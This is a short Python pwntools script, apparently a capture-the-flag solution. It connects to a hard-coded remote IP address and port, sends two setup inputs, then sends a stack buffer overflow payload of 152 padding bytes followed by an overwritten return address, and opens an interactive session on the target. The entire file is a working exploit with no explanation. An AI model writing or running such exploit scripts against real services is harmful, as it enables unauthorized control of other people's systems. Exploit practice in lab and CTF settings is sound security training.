from pwn import *

p = remote('52.184.85.16', 12345)
p.sendline("13523111")
p.sendline("2")
#p = process("2")

payload = b"A" * 152
payload += b"\xec\x13\x40\x00\x00\x00\x00\x00"

p.sendline(payload) 
p.interactive()